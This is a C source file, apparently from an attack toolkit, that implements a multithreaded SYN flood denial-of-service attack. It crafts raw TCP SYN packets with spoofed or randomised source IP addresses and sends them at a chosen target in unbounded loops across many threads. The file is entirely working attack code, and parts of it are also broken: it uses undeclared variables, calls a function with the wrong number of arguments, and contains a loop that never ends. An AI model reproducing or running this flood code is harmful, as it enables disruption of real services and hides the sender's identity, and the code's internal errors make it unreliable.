#include <stdio.h>
// For memset
#include <string.h>
#include <sys/socket.h>
// For exit(0);
#include <stdlib.h>
// For errno - the error number
#include <errno.h>
// Provides declarations for tcp header
#include <netinet/tcp.h>
// Provides declarations for ip header
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "syn_flood.h"
#include "../debug.h"
#include "../main.h"

//int attack(const struct AHTTP_INPUT *ainput)
static int SendSYN(const pSynFloodSt syn_st)
{
    // start attack now
    // create a raw socke
    // the program must run as root
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
    {
        ErrorMessage("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DebugMessage("This program should run as root user");
        }
        else if (errno == 24)
        {
            DebugMessage("You shoud check max file number use 'ulimit -n' in linux");
            DebugMessage("And change the max file number use 'ulimit -n <setting number>'");
            DebugMessage("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }
    int i;
    // datagram to represent the packet
    char datagram[4096];
    //IP header
    struct iphdr *iph = (struct iphdr *)datagram;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;

    //strcpy(source_ip, "192.168.1.1");
    sin.sin_family = AF_INET;
    sin.sin_port = htons((int)ss->dst_port);
    //sin.sin_port = htons(80);
    // target
    sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
    //sin.sin_addr.s_addr = inet_addr("1.2.3.4");

    // Zero out the buffer
    //memset(datagram, 0, 4096);
    if (!memset(datagram, 0, 4096))
    {
        ErrorMessage("Attack memset failed");
        return 1;
    }

    // fill in the IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    // id of this packet
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    // set to 0 before calculating checksum
    iph->check = 0;
    // spoof the source ip address
    iph->saddr = inet_addr(ss->src_ip);
    iph->daddr = sin.sin_addr.s_addr;

    iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);

    // TCP Header
    tcph->source = htons((int)ss->src_port);
    //tcph->source = htons(3306);
    //tcph->source = htons(1234);
    tcph->dest = htons((int)ss->dst_port);
    //tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    // First and only tcp segment
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    // maximum allowed window size
    tcph->window = htons(5840);
    // if you set a checksum to zero, your kernel's IP stack
    // should fill in the correct checksum during transmission
    tcph->check = 0;

    tcph->urg_ptr = 0;
    // Now the IP checksum

    psh.source_address = inet_addr(ss->src_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);

    if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
    {
        ErrorMessage("Attack memcpy failed");
        return 1;
    }

    tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        ErrorMessage("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        ErrorMessage("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
        //exit(0);
        return 1;
    }

    // Uncommend the loop if you want to flood :)
    //while (1)
    //{
    //Send the packet
    for (i = 0; i < ss->each_ip_repeat; i++)
    {
        //int l;
        if (sendto(
                socket_fd,               // our socket
                datagram,                // the buffer containing headers and data
                iph->tot_len,            // total length of our datagram
                0,                       // routing flags, normally always 0
                (struct sockaddr *)&sin, // socket addr, just like in
                sizeof(sin)) < 0)        // a normal send()
        {
            ErrorMessage("Attack send failed");
            //break;
        }
        // Data send successfull
        else
        {
            //debug(debug_level, 2, "Attack packet end successful");
        }
    }
    close(socket_fd);

    return 0;
}

static void FreeSYNStructBuff(pSYNStruct input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static int _AttackThread(pParameter parameter)
{

    pSynFloodSt syn_flood_st = (pSynFloodSt)malloc(sizeof(SynFloodSt));
    parameter->_syn_flood_st = syn_flood_st;
    int i;

    // init the target ip and port
    syn_flood_st->dst_ip = (char *)malloc(MAX_IP_LENGTH);
    #ifdef DEBUG
    if (!(syn_flood_st->dst_ip))
    {
        MallocErrorMessage();
        return -1;
    }
    #endif
    memset(syn_flood_st->dst_ip, 0, MAX_IP_LENGTH);
    strncpy(syn_flood_st->dst_ip, parameter->target_address, strlen(parameter->target_address));
    syn_flood_st->dst_port = parameter->target_port;

    syn_flood_st->src_ip = (char *)malloc(MAX_IP_LENGTH);
    #ifdef DEBUG
    if (!(syn_flood_st->src_ip))
    {
        MallocErrorMessage();
        return -1;
    }
    #endif
    memset(syn_flood_st->src_ip, 0, MAX_IP_LENGTH);
    strncpy(syn_flood_st->src_ip, SYN_FLOOD_SRC_IP_DEFAULT, strlen(SYN_FLOOD_SRC_IP_DEFAULT));
    syn_flood_st->src_port = (int)SYN_FLOOD_SRC_PORT_DEFAULT;
    
    #ifdef DEBUG
    InfoMessage("AttackThread start sending data...");
    #endif
    // here get the random ip address and port
    if (parameter->random_saddr == ENABLE)
    {
        for (;;)
        {
            if (!GetRandomIP(&(syn_flood_st->src_ip)))
            {
                ErrorMessage("AttackThread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(syn_flood_st->src_port));
        }
    }
    // here we will use the default ip address and port

    // rport is random source port
    for (i = 0; i < parameter->each_ip_repeat; i++)
    {
        if (SendSYN(syn_struct, parameter->debug_mode))
        {
            ErrorMessage("AttackThread Attack failed");
            //return 1;
        }
    }
    FreeRandomIPBuff(syn_struct->src_ip);
    FreeSYNStructBuff(syn_struct);
    return 0;
}

int StartSYNFloodAttack(const pParameter parameter)
{
    /* run this program as root */

    pthread_t tid[parameter->thread_num];
    pthread_attr_t attr;
    int j, ret;

    #ifdef DEBUG
    InfoMessage("Enter StartSYNFloodAttack");
    #endif

    if (parameter->target_address)
    {
        if (strstr(parameter->target_address, "http"))
        {
            ErrorMessage("please check your input, syn flood target address should not include http");
            return -1;
        }
    }
    if (parameter->target_port == 0)
    {
        ErrorMessage("please set the target port in syn flood attack");
        return -1;
    }

    // unlimit loop
    for (;;)
    {
        // only one process
        for (j = 0; j < parameter->thread_num; j++)
        {
            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                ErrorMessage("StartSYNFloodAttack pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                ErrorMessage("StartSYNFloodAttack pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)_AttackThread, parameter);

            #ifdef DEBUG
            InfoMessage("tid: %ld", tid[j]);
            if (ret != 0)
            {
                ErrorMessage("ret: %d", ret);
                ErrorMessage("Create pthread failed");
                return 1;
            }
            #endif

            pthread_attr_destroy(&attr);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < parameter->thread_num; j++)
        {
            pthread_join(tid[j], NULL);
        }
    }

    return 0;
}

/*
int main(void)
{
    // for test
    pAllAttackParameter p = (pAllAttackParameter)malloc(sizeof(Input));
    p->random_sip_address = ENABLE_SIP;
    p->each_ip_repeat = 1024;
    strcpy(p->address, "192.168.1.1:80");
    SYNFloodAttack_Thread(p);
    return 0;
}
*/